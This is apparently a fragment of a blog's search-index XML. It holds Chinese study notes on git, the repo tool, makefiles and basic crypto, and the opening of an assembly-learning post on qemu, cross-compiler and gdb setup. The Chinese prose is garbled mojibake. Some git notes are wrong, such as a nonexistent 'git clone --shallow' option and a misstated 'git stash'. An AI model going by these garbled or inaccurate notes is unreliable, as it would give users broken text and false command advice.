--oneline</span><br></pre></td></tr></table></figure><ul><li><p>å…¶ä¸­å­˜åœ¨ä¸€ä¸ª <code>HEAD</code> æŒ‡é’ˆæŒ‡å‘å½“å‰å·¥ä½œçš„åˆ†æ”¯ã€‚</p></li><li><p>æˆ‘ä»¬æƒ³å¿½ç•¥æŸäº›æ–‡ä»¶æ—¶</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ gitignore æ–‡ä»¶é…ç½®</span></span><br><span class="line"><span class="built_in">touch</span> .gitignore</span><br><span class="line"></span><br><span class="line">*.jpg   <span class="comment"># å¿½ç•¥æ‰€æœ‰çš„ jpgæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><ul><li>æœ¬åœ°æ“ä½œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="comment"># å†™ç‚¹æ–°æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; readme.md  <span class="comment"># å¤„äºuntracked çŠ¶æ€ï¼Œä½¿ç”¨git status ä¼šå­˜åœ¨æç¤º</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æš‚å­˜åŒº</span></span><br><span class="line">git add readme.txt       <span class="comment"># å¤„äºtracked çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æäº¤åˆ°æœ¬åœ°ä»“åº“</span></span><br><span class="line">git commit  <span class="comment"># è¿›å…¥æ–‡ä»¶ï¼Œè¿›è¡Œæè¿°ä¿®æ”¹çš„å†…å®¹</span></span><br><span class="line">-m <span class="string">&quot;message&quot;</span>  <span class="comment"># message ä»£è¡¨æè¿°ï¼Œç®€çŸ­æè¿°å¯ä»¥è¿™æ ·ä½¿ç”¨</span></span><br></pre></td></tr></table></figure><ul><li>æäº¤åˆ°è¿œç¨‹ä»£ç ä»“åº“</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. è¿œç¨‹åˆ›å»ºåç›´æ¥cloneä¸‹æ¥ï¼Œç„¶åå†å†™å†…å®¹</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="string">&quot;your-repo&quot;</span></span><br><span class="line">git remote -v   <span class="comment"># æŸ¥çœ‹å’Œé‚£äº›ä»“åº“æœ‰è”ç³»</span></span><br><span class="line">git push        <span class="comment"># æœ‰.gitæ–‡ä»¶å¤¹ï¼Œå¯ä»¥æ‰¾åˆ°ä»“åº“æäº¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æˆ‘ä»¬åœ¨æœ¬åœ°å†™äº†å¾ˆå¤šæ–‡ä»¶ï¼Œä½†æ˜¯ä¸­é€”æƒ³èµ·æ¥æ²¡æœ‰ä½¿ç”¨gitï¼Œæˆ‘ä»¬å¦‚ä½•åšï¼Ÿ</span></span><br><span class="line"><span class="comment">## è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»ºä»“åº“</span></span><br><span class="line"><span class="comment">## ç„¶åå†æœ¬åœ°</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit</span><br><span class="line">git remote add <span class="string">&quot;name&quot;</span> git@&lt;your-repo&gt;  <span class="comment"># å…³è”è¿œç¨‹ä»“åº“ã€‚</span></span><br><span class="line"><span class="comment"># name è‡ªå·±å–ï¼Œå¯ä»¥å…³è”å¾ˆå¤šä»“åº“ï¼Œæ ¹æ®åå­—åŒºåˆ†</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## ä½†æ˜¯æœ¬åœ°ä»“åº“ä¸€èˆ¬æ˜¯masterï¼ŒæŸäº›å¹³å°æ˜¯main(ä¹Ÿå¯ä»¥é€‰ï¼Œä½†æ˜¯é»˜è®¤æ˜¯main)ï¼Œè¿™ä¸€æ­¥å¯èƒ½å‡ºé”™ï¼Œéœ€è¦åˆ‡æ¢åˆ†æ”¯ `git checkout -b main`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## è¿œç¨‹åˆ†æ”¯ä¸å­˜åœ¨ä¼šåˆ›å»ºä¸€ä¸ª</span></span><br><span class="line">git push <span class="string">&quot;ä»“åº“åç§°&quot;</span> <span class="string">&quot;æœ¬åœ°åˆ†æ”¯å&quot;</span>:<span class="string">&quot;è¿œç¨‹åˆ†æ”¯å&quot;</span>   <span class="comment"># å¦‚æœæœ¬åœ°åˆ†æ”¯åä¸è¿œç¨‹åˆ†æ”¯åç›¸åŒï¼Œåˆ™å¯ä»¥çœç•¥å†’å·</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## åˆ é™¤è¿œç¨‹ä»“åº“</span></span><br><span class="line">git remote <span class="built_in">rm</span> <span class="string">&quot;ä»“åº“å&quot;</span></span><br></pre></td></tr></table></figure><ul><li>ä»è¿œç¨‹ä»“åº“åˆ°å·¥ä½œåŒºã€‚æ¯”å¦‚å›¢é˜Ÿåˆä½œä¸­ï¼Œè¿œç¨‹ä»“åº“æ›´æ–°äº†ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåŒæ­¥ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç›´æ¥åŒæ­¥åˆ°æœ¬åœ°ï¼Œä¼šç›´æ¥æ›´æ–°æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”±äºpull ä¸€æ­¥åˆ°ä½ï¼Œä¹Ÿå¯åˆ†æ­¥è¿›è¡Œ</span></span><br><span class="line"><span class="comment">## å…ˆæ›´æ–°åˆ°åˆ°æœ¬åœ°ä»“åº“</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment">## diff å¯¹æ¯”åŒºåˆ«</span></span><br><span class="line">git diff </span><br><span class="line">    <span class="comment"># æŸ¥çœ‹æœ¬åœ°ä»“åº“å’Œå·¥ä½œåŒºçš„åŒºåˆ«</span></span><br><span class="line"><span class="comment">## pull åˆå¹¶ = git fetch + git merge</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><ul><li><p>åˆ†æ”¯æ“ä½œã€‚æˆ‘ä»¬å‚ä¸å¼€æºé¡¹ç›®æ—¶ï¼Œå»ºè®®åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯pushï¼Œç”±é¡¹ç›®è´Ÿè´£äººå†³å®šæ˜¯å¦åˆå¹¶(merge)ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git branch <span class="string">&quot;name&quot;</span>  <span class="comment"># åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ </span></span><br><span class="line">-vv   <span class="comment"># æŸ¥çœ‹åˆ†æ”¯ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">git checkout <span class="string">&quot;name&quot;</span>  <span class="comment"># åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="line">-d <span class="string">&quot;name&quot;</span>    <span class="comment"># åˆ é™¤åˆ†æ”¯</span></span><br><span class="line">-D <span class="string">&quot;name&quot;</span>    <span class="comment"># æš´åŠ›åˆ é™¤</span></span><br><span class="line">-b <span class="string">&quot;name&quot;</span>    <span class="comment"># åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ç„¶ååˆ‡æ¢</span></span><br><span class="line"></span><br><span class="line">git merge      <span class="comment"># å°†åˆ«çš„åˆ†æ”¯åˆå¹¶åˆ° `å½“å‰åˆ†æ”¯` ä¸­</span></span><br><span class="line"><span class="comment"># å¯èƒ½ä¼šå­˜åœ¨å†²çªï¼Œåœ¨æŸä¸€ä¸ªç›¸åŒçš„ä½ç½®å­˜åœ¨ä¸åŒçš„å†…å®¹.ä¿å­˜çš„è¯ï¼Œè‡ªå·±å†³å®šç„¶åä¿®æ”¹å†²çªæ–‡ä»¶å°±è¡Œ</span></span><br></pre></td></tr></table></figure></li><li><p>git clone ä¼šå¤åˆ¶è¿œç¨‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…å«å…¶æ‰€æœ‰çš„ <code>snapshot</code> æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>--shallow</code> å¿½ç•¥è¿™äº›</p></li><li><p>git å›æ»šï¼šå½“æˆ‘ä»¬åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸­<code>commit</code>åå‘ç°ä¸€ä¸ªå·¨å¤§çš„é”™è¯¯ï¼Œéœ€è¦å›é€€åˆ°ä¹‹å‰çš„ç‰ˆæœ¬ã€‚æ”¹å˜ <code>HEAD</code> æŒ‡é’ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git stash   <span class="comment"># å›é€€åˆ°ä¸Šä¸€ä¸ªcommit ç‰ˆæœ¬</span></span><br><span class="line">git bisect  <span class="comment"># æ¯”è¾ƒå¼ºå¤§çš„å·¥å…·</span></span><br><span class="line"></span><br><span class="line">git reset </span><br><span class="line">--hard         <span class="comment"># ä¼šä¸¢å¤±æœ€æ–°çš„ä»£ç ä¿®æ”¹</span></span><br><span class="line">--soft         <span class="comment"># å°† HEAD æŒ‡é’ˆå›é€€åˆ°æŒ‡å®šæäº¤ï¼Œä¸æ”¹å˜æš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line">HEAD^       <span class="comment"># ä¸Šä¸€ä¸ª ç‰ˆæœ¬</span></span><br><span class="line">HEAD~&lt;num&gt;  <span class="comment"># å›é€€numä¸ªç‰ˆæœ¬</span></span><br><span class="line">&lt;<span class="built_in">hash</span>&gt;      <span class="comment"># å›é€€åˆ°æŒ‡å®šå“ˆå¸Œå€¼çš„ç‰ˆæœ¬</span></span><br><span class="line"></span><br><span class="line">git revert -n <span class="built_in">hash</span>   <span class="comment"># å°†ç‰ˆæœ¬å¤åˆ¶ä¸€ä»½ï¼Œä¸ä¼šé”€æ¯</span></span><br></pre></td></tr></table></figure></li><li><p>ç°åœ¨çš„IDEä¸­å­˜åœ¨gitç›¸å…³çš„å·¥å…·ï¼Œä¹Ÿæ›´åŠ æ–¹ä¾¿äº†æˆ‘ä»¬çš„ä½¿ç”¨ã€‚</p></li><li><p>ä¹Ÿå­˜åœ¨å…¶ä½™çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œsvn, repoâ€¦â€¦</p></li></ul><h3 id="repo-ä½¿ç”¨"><a href="#repo-ä½¿ç”¨" class="headerlink" title="repo ä½¿ç”¨"></a>repo ä½¿ç”¨</h3><ul><li><p><a href="https://source.android.google.cn/docs/setup/create/repo?hl=zh-cn#start">repo</a> æ›´é€‚åˆå¤šä¸ªä»“åº“çš„ç®¡ç†ï¼Œå¹³å¸¸æˆ‘ä»¬è§çš„é¡¹ç›®éƒ½æ˜¯ä¸€ä¸ªä»“åº“ã€‚ä½†æ˜¯å‘Androidè¿™æ ·çš„ä¾èµ–ä¸Šç™¾ä¸ªgitä»“åº“æ¥è¯´ï¼Œä¾é gitå¹¶ä¸æ˜¯å¤šä¹ˆå¥½ä½¿ç”¨ï¼Œå› æ­¤google å¼€å‘äº†repoå·¥å…·ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªpythonè„šæœ¬ï¼ŒåŸºäºgitã€‚</p></li><li><p>åˆå§‹åŒ–</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">repo init</span><br><span class="line">-u git@&lt;repo&gt;/mainfest.git  <span class="comment"># é»˜è®¤ä¸ºgoogleçš„ä»“åº“ https://gerrit.googlesource.com/git-repo</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªç›®å½•ä¸‹æœ€ç®€å•åªéœ€è¦ default.xml</span></span><br><span class="line">-b  <span class="comment"># æŒ‡å®šbranch</span></span><br></pre></td></tr></table></figure><ul><li>-uåçš„ä»“åº“, xmlæ–‡ä»¶(é»˜è®¤<code>default.xml</code>, æˆ‘ä»¬å¯ä»¥è‡ªå·±é€‰æ‹©)ï¼Œç„¶åæˆ‘ä»¬æ‹‰å–çš„æ—¶å€™ä¼šå°†æ‰€æœ‰çš„gitä»“åº“æ‹‰å–ä¸‹æ¥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">repo init -u &lt;repo&gt;</span><br><span class="line">-m æŒ‡å®šxmlæ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li>æ‹‰å–ä»£ç åˆ°æœ¬åœ°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> -c</span><br></pre></td></tr></table></figure><ul><li>åˆ†æ”¯</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">repo branch  <span class="comment"># æŸ¥çœ‹åˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line">repo start &lt;branch_name&gt; --all <span class="comment"># åˆ›å»ºåˆ†æ”¯å¹¶è¿›å…¥</span></span><br></pre></td></tr></table></figure><h2 id="lecture7-debugging-profiling"><a href="#lecture7-debugging-profiling" class="headerlink" title="lecture7: debugging &amp; profiling"></a>lecture7: debugging &amp; profiling</h2><blockquote><p>è°ƒè¯•ç¨‹åºä»¥åŠæ€§èƒ½åˆ†æ</p></blockquote><ul><li><p>æŸ¥çœ‹æ—¥å¿—ï¼Œæ‰“å°æ—¥å¿—ï¼Œåˆ¶ä½œæ—¥å¿—</p></li><li><p>è°ƒè¯•å™¨</p><ul><li>GNU gdbï¼Œå¯ä»¥è°ƒè¯•å‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶ç¨‹åº</li><li>python pdbï¼Œpythonè°ƒè¯•</li><li>æµè§ˆå™¨è°ƒè¯•js</li></ul></li><li><p>æ€§èƒ½æµ‹è¯•</p><ul><li>æµ‹è¯•ä¸€ä¸ªç¨‹åºè¿è¡Œ time</li></ul></li></ul><h2 id="lecture8-metaprogramming"><a href="#lecture8-metaprogramming" class="headerlink" title="lecture8: metaprogramming"></a>lecture8: metaprogramming</h2><ul><li><p>å¦‚ä½•æ›´é«˜çš„ç®¡ç†é¡¹ç›®ã€æµ‹è¯•ã€ä¾èµ–ç®¡ç†ã€‚ä½¿ç”¨ <code>makefile</code></p></li><li><p>makefile çš„ä½¿ç”¨æ¯”è¾ƒç®€å•ã€‚</p></li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">ç›®æ ‡: ä¾èµ–</span></span><br><span class="line">å‘½ä»¤  //å‰é¢å¿…é¡»æ˜¯tabé”®</span><br><span class="line"></span><br><span class="line"><span class="section">main: main.c</span></span><br><span class="line">gcc main.c -o mian</span><br></pre></td></tr></table></figure><ul><li>ä¸€äº›è¯­æ³•</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$^</span>   æ‰€æœ‰çš„ä¾èµ–é¡¹</span><br><span class="line"><span class="variable">$&lt;</span>   ä¸€ä¸ªä¾èµ–é¡¹</span><br><span class="line"><span class="variable">$@</span>   ç›®æ ‡æ–‡ä»¶</span><br><span class="line">echo æ‰“å°</span><br><span class="line">%    é€šé…ç¬¦</span><br><span class="line">*    ä¹Ÿæ˜¯é€šé…ç¬¦</span><br></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬ç¼–è¯‘æŸäº›å¼€æºé¡¹ç›®æ—¶ä¹Ÿä¼šä½¿ç”¨ <code>make</code> å‘½ä»¤ï¼Œå¯ä»¥çœ‹çœ‹åˆ«äººæ€ä¹ˆå†™çš„ã€‚</li><li>å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–çš„é€‰æ‹©ï¼Œæ¯”å¦‚ <code>cmake</code></li></ul><h2 id="lecture9-security-crypto"><a href="#lecture9-security-crypto" class="headerlink" title="lecture9: security &amp; crypto"></a>lecture9: security &amp; crypto</h2><blockquote><p>å®‰å…¨å¾ˆå¤šï¼Œä¹Ÿæ˜¯ä¸€é—¨ä¸“é—¨çš„å­¦ç§‘ï¼Œæƒ³è¦æ·±å…¥å°±éœ€è¦å­¦ä¸“ä¸šè¯¾</p></blockquote><ul><li><p>hash: ç”¨ä½œä¿¡æ¯æ‘˜è¦ï¼Œç­¾åï¼Œæ£€æŸ¥æ–‡ä»¶çš„å®Œæ•´æ€§ã€‚</p><ul><li>md5</li><li>sha-1&#x2F;2&#x2F;3</li></ul></li><li><p>å¯¹ç§°åŠ å¯†</p><ul><li>DES</li><li>AES</li></ul></li><li><p>éå¯¹ç§°åŠ å¯†</p><ul><li>RSA</li><li>ECC</li></ul></li><li><p>æ•°å­—ç­¾å</p></li></ul><h2 id="lecture10-potpourri"><a href="#lecture10-potpourri" class="headerlink" title="lecture10: potpourri"></a>lecture10: potpourri</h2><blockquote><p>å¤§æ‚çƒ©ï¼šè®²è¿°ä¸€äº›æ¦‚å¿µï¼Œç†Ÿç»ƒè¿˜å¾—åœ¨ä»¥åå¤šç»ƒä¹ </p></blockquote><ul><li><p>é”®ç›˜æ˜ å°„</p><ul><li>é”®ç›˜ä¸Šçš„<code>Caps Lock</code>å‡ ä¹ä¸æ€ä¹ˆä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°é…ç½®ä¸€ä¸‹(æ¯”å¦‚æ¯”è¾ƒå°çš„Esc)ï¼Œè®©å…¶å‘æŒ¥ä½œç”¨</li></ul></li><li><p>å®ˆæŠ¤è¿›ç¨‹ï¼Œdaemon</p></li><li><p>APIs</p><ul><li>æ¯”å¦‚è¯´éƒ¨åˆ†å¤©æ°”çš„APIï¼Œæˆ‘ä»¬åªéœ€è¦è¯·æ±‚ç‰¹å®šçš„URLå¸¦ç€æ­£ç¡®çš„å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾—è¿”å›ç»“æœã€‚</li></ul></li><li><p>å‘½ä»¤è¡Œå‚æ•°</p><ul><li>æˆ‘ä»¬ä½¿ç”¨çš„å‘½ä»¤å¯ä»¥å¸¦æœ‰å‚æ•°</li></ul></li><li><p>Window Manage</p></li><li><p>VPN</p></li><li><p>Jupyter Notebook: äº¤äº’å¼ç¼–ç¨‹</p></li><li><p>GitHub: ä»£ç æ‰˜ç®¡å¹³å°</p><ul><li>åˆ›å»ºè‡ªå·±çš„ä»“åº“</li><li>æissueï¼Œè§£å†³é—®é¢˜</li><li>pr: pull requestï¼Œè‡ªå·±å†™çš„æäº¤ç»™ä½œè€…</li><li>merge åˆ«äººçš„è¯·æ±‚</li></ul></li></ul><h2 id="lecture11-Q-A"><a href="#lecture11-Q-A" class="headerlink" title="lecture11: Q&amp;A"></a>lecture11: Q&amp;A</h2><blockquote><p>æ¥è‡ªå­¦ç”Ÿçš„é—®é¢˜</p></blockquote><ul><li>å¦‚ä½•è¿›è¡Œæ“ä½œç³»ç»Ÿçš„å­¦ä¹ ï¼Ÿ<ul><li>learn by exercise: å­¦ä¹ æ¯”è¾ƒå‡ºåçš„ OS è¯¾ç¨‹ï¼Œå®Œæˆç›¸åº”çš„labï¼Œå®ç°è‡ªå·±çš„OS</li></ul></li></ul><p>â€¦â€¦ è‡ªå·±çœ‹çœ‹å°±è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> vim </tag>
            
            <tag> terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ±‡ç¼–å­¦ä¹ </title>
      <link href="/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åŸºæœ¬çš„æ±‡ç¼–å­¦ä¹ ã€‚</p></blockquote><span id="more"></span><ul><li><p>å­¦ä¹ ç›®æ ‡ï¼šé¦–å…ˆèƒ½çœ‹æ‡‚ã€‚ç„¶åå°è¯•ç¼–å†™ <code>shellcode</code>ã€‚</p></li><li><p>ä¸ªäººä¹ æƒ¯å°å†™æŒ‡ä»¤ã€‚</p></li><li><p><code>little-endian</code></p></li><li><p>å¸¸è§çš„æ±‡ç¼–æ ¼å¼</p><ul><li>Intelæ ¼å¼ã€‚</li><li>AT&amp;Tï¼Œå®é™…ä½¿ç”¨ä¹Ÿå¾ˆå¸¸è§(Linuxä¸­é»˜è®¤çš„æ ¼å¼)</li></ul></li><li><p>éƒ¨åˆ†åè¯</p></li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ISA: Instruction Set Architecture, æŒ‡ä»¤é›†æ¶æ„</span><br><span class="line">RISC: Reduced Instruction Set Computer, ç²¾ç®€æŒ‡ä»¤é›†è®¡ç®—æœº</span><br><span class="line">CISC: Complex Instruction Set Computer, å¤æ‚æŒ‡ä»¤é›†è®¡ç®—æœº</span><br><span class="line">ABI: application binary interface</span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒé—®é¢˜"><a href="#ç¯å¢ƒé—®é¢˜" class="headerlink" title="ç¯å¢ƒé—®é¢˜"></a>ç¯å¢ƒé—®é¢˜</h2><ul><li><p>æœ¬æœº linux: ubuntu &amp;&amp; kali virtual machineï¼›CPU: AMDã€‚</p><ul><li>æ— æ³•ç›´æ¥è¿è¡Œ <code>arm</code> å’Œ <code>mips</code> æ¶æ„çš„ç¨‹åº</li></ul></li><li><p>armå¯ä»¥ä½¿ç”¨æ‰‹æœºç»ˆç«¯ <a href="https://termux.dev/en/">Termux</a> è¿›è¡Œè¿è¡Œã€‚æˆ–è€…è´­ä¹°äº‘æœåŠ¡å™¨?</p></li></ul><h3 id="ç¯å¢ƒå®‰è£…"><a href="#ç¯å¢ƒå®‰è£…" class="headerlink" title="ç¯å¢ƒå®‰è£…"></a>ç¯å¢ƒå®‰è£…</h3><ul><li><p>åŸºæœ¬ç¯å¢ƒ <code>user mode+kernel mode</code>ã€‚ </p><ul><li>è¿è¡Œç¨‹åºåªéœ€è¦ä¸€ä¸ª<code>qemu-user</code> å°±è¡Œï¼Œå¯åŠ¨ç³»ç»Ÿéœ€è¦ <code>qemu-system-xxx</code></li><li>ç”šè‡³å¯ä»¥ <code>qemu-system</code> è·‘kernelï¼Œç„¶åè·‘ç¨‹åºğŸ˜‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># qemu userç”¨æˆ·æ€ systemå¯åŠ¨å†…æ ¸é•œåƒ</span></span><br><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure></li></ul></li><li><p>arm ç¯å¢ƒ</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gun ç¼–è¯‘å·¥å…·é“¾ + åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">sudo apt list gcc* | grep arm</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu arm system mode</span></span><br><span class="line">sudo apt list  <span class="string">&quot;qemu*&quot;</span> <span class="comment"># å¯»æ‰¾å¯¹ç”¨çš„arch</span></span><br><span class="line">sudo apt install qemu-system-arm qemu-system-aarch64</span><br></pre></td></tr></table></figure><ul><li>mips ç¯å¢ƒ.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gun ç¼–è¯‘å·¥å…·é“¾</span></span><br><span class="line">sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu mips system mode, ç›®å‰æ²¡è§è¿‡ï¼Œ user mode åº”è¯¥å¤Ÿäº†</span></span><br><span class="line">sudo apt install qemu-system-mips</span><br></pre></td></tr></table></figure><ul><li>gdb</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb gdb-multiarch</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><ul><li><p>qemu-user ä½¿ç”¨ <code>-g</code> gdbæ¨¡å¼ ç¡®å®šgdbè°ƒè¯•ç«¯å£</p></li><li><p>qemu-system ä½¿ç”¨ <code>-s -S  æˆ–è€… -gdb tcp:1234</code> gdbserverç­‰å¾…è¿æ¥ï¼Œé»˜è®¤ç«¯å£ <code>1234</code></p></li><li><p>ç¼–ç¨‹æµ‹è¯•</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello, world!&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“ã€‚<code>lib-&gt;/usr/lib</code> çš„é“¾æ¥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /usr/lib | grep arm  <span class="comment"># aarch64 mips...</span></span><br></pre></td></tr></table></figure><ul><li>arm æµ‹è¯•ï¼Œä¸çŸ¥ä¸ºä»€ä¹ˆï¼Œæµ‹è¯•æ—¶ <code>-g</code>æ”¾å‰é¢æ‰æˆåŠŸ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¼–è¯‘</span></span><br><span class="line">arm-linux-gnueabi-gcc hello.c -o helloarm -g</span><br><span class="line">aarch64-linux-gnu-gcc hello.c -o helloaarch -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œ</span></span><br><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm</span><br><span class="line">$ qemu-aarch64</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒè¯•</span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm </span><br><span class="line">$ gdb-multiarch</span><br><span class="line">gdb&gt; <span class="built_in">set</span> <span class="built_in">arch</span> arm <span class="comment"># aarch64</span></span><br><span class="line">gdb&gt; target remote localhost:1234</span><br><span class="line">xxx 